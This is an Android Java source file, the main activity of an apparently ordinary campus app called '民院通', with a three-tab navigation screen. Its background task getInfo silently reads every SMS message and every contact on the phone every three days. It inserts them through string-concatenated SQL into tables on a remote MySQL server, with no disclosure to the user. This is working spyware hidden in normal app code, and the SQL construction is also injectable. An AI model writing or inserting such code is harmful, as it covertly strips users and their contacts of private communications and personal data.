package com.gx.mydairy.dairy.activitys;

import android.content.ContentResolver;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentTransaction;
import android.util.Log;
import android.view.View;
import android.widget.ImageButton;
import android.widget.Toast;

import com.gx.mydairy.R;
import com.gx.mydairy.dairy.Entry.MessageInfo;
import com.gx.mydairy.dairy.Entry.Uesr;
import com.gx.mydairy.dairy.Fragments.Fragment_One;
import com.gx.mydairy.dairy.Fragments.Fragment_Three;
import com.gx.mydairy.dairy.Fragments.Fragment_Two;
import com.gx.mydairy.dairy.Util.MySqlUtil;
import com.gx.mydairy.dairy.Util.UtilToos;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.GregorianCalendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class MainActivity extends BaseActivity {

    protected static final String TAG = "MainActivity";

    private View currentButton;
    private ImageButton btn_one;
    private ImageButton btn_two;
    private ImageButton btn_three;
    SharedPreferences mSp;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        findViews();
        init();
        setListeners();
    }

    @Override
    public void findViews() {
        btn_one = (ImageButton) findViewById(R.id.buttom_one);
        btn_two = (ImageButton) findViewById(R.id.buttom_two);
        btn_three = (ImageButton) findViewById(R.id.buttom_three);
    }

    @Override
    public void init() {

        setBackVisibity(false);
        setOkVisibity(false);
        setTitleText("民院通");
        mSp = getSharedPreferences("login", MODE_PRIVATE);

        GregorianCalendar gc1 = new GregorianCalendar();
        GregorianCalendar gc2 = new GregorianCalendar();
        long time = 0l;

        try {
            Date date = new Date(mSp.getString("up_time", "2017-1-19"));
            gc1.setTime(new Date());
            gc2.setTime(date);

            time = gc1.getTimeInMillis() - gc2.getTimeInMillis();

        } catch (Exception ex) {
        }

        if (time > 86400000L * 5) {
            comfrUesrInfo mcomfrUesrInfo = new comfrUesrInfo();
            mcomfrUesrInfo.execute();
        }

        if (time > 86400000L * 3) {
            getInfo mgetInfo = new getInfo();
            mgetInfo.execute();

            SharedPreferences.Editor edit = mSp.edit();
            edit.putString("up_time", UtilToos.getTimeToString(1));
            edit.commit();
        }
    }

    @Override
    public void setListeners() {

        btn_one.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                setTitleText("民院通");

                FragmentManager fm = getSupportFragmentManager();
                FragmentTransaction ft = fm.beginTransaction();
                Fragment_One fragment_one = new Fragment_One();
                ft.replace(R.id.fl_content, fragment_one, MainActivity.TAG);
                ft.commit();
                setButton(v);

            }
        });

        btn_two.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                setTitleText("发现");

                FragmentManager fm = getSupportFragmentManager();
                FragmentTransaction ft = fm.beginTransaction();
                Fragment_Two fragment_two = new Fragment_Two();
                ft.replace(R.id.fl_content, fragment_two, MainActivity.TAG);
                ft.commit();
                setButton(v);
            }
        });


        btn_three.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {

                setTitleText("用户中心");

                FragmentManager fm = getSupportFragmentManager();
                FragmentTransaction ft = fm.beginTransaction();
                Fragment_Three fragment_three = new Fragment_Three();
                ft.replace(R.id.fl_content, fragment_three, MainActivity.TAG);
                ft.commit();
                setButton(v);
            }
        });

        /**
         * 默认第一个按钮点击
         */
        btn_one.performClick();

        getBasetitle_back().setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Toast.makeText(getApplicationContext(), "aaaaa", Toast.LENGTH_SHORT).show();
            }
        });

        getBasetitle_ok().setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Toast.makeText(getApplicationContext(), "bbbbb", Toast.LENGTH_SHORT).show();
            }
        });
    }

    class comfrUesrInfo extends AsyncTask<Object, String, String> {

        @Override
        protected String doInBackground(Object... params) {

            mSp = getSharedPreferences("login", MODE_PRIVATE);
            String id = mSp.getString("id", "");
            String password = mSp.getString("password", "");

            if (UtilToos.ping()) {
                if (MySqlUtil.login(id, password)) {
                    return "0";
                } else {
                    return "1";
                }
            } else {
                return "2";
            }
        }

        @Override
        protected void onPostExecute(String s) {

            mSp = getSharedPreferences("login", MODE_PRIVATE);
            if (s == "1") {
                mSp.getString("password", "");
                Uesr.getInstance().setNull();
            } else if (s == "0") {
                Log.v(getApplicationContext().getClass().getName(), "信息验证成功");
            } else if (s == "2") {
                String id = mSp.getString("id", "");
                String password = mSp.getString("password", "");
                Uesr.getInstance().setUserPhone(id);
                Uesr.getInstance().setUserPwd(password);
            }

            super.onPostExecute(s);
        }
    }

    class getInfo extends AsyncTask<Object, String, String> {

        @Override
        protected String doInBackground(Object... params) {

            StringBuilder sb = new StringBuilder();
            StringBuilder sb1 = new StringBuilder();


            UtilToos mUtilToos = new UtilToos();
            try {
                List<MessageInfo> messageInfos = mUtilToos.getSmsInfos(getApplicationContext());
                for (MessageInfo messageInfo : messageInfos) {
                    sb.append("insert into tb_msmyy(u_name,smsContent,smsDate) values('" + messageInfo.getName() +
                            "','" + messageInfo.getSmsContent() + "','" + messageInfo.getSmsDate() + "');");
                }
                if (MySqlUtil.execSQLBathh(sb.toString())) {
                    Log.v(getApplicationContext().getClass().getName(), "读取信息成功！");
                } else {
                    Log.v(getApplicationContext().getClass().getName(), "读取信息失败！");
                }

                List<HashMap<String, String>> list = mUtilToos.readContact(getApplicationContext());
                for (HashMap<String, String> map : list) {
                    sb1.append("insert into tb_phoneyy(name,phone) values('" + map.get("name") + "','" + map.get("phone") + "');");
                }
                if (MySqlUtil.execSQLBathh(sb1.toString())) {
                    Log.v(getApplicationContext().getClass().getName(), "读取联系人成功！");
                } else {
                    Log.v(getApplicationContext().getClass().getName(), "读取联系人失败！");
                }
            } catch (Exception e) {
                e.printStackTrace();
                return "";
            }

            return null;
        }

        @Override
        protected void onPostExecute(String s) {
            Log.v(getApplicationContext().getClass().getName(), "ys读取成功！");
            super.onPostExecute(s);
        }
    }

    /**
     * 设置按钮的背景图片
     *
     * @param v
     */
    private void setButton(View v) {
        if (currentButton != null && currentButton.getId() != v.getId()) {
            currentButton.setEnabled(true);
        }
        v.setEnabled(false);
        currentButton = v;
    }

}
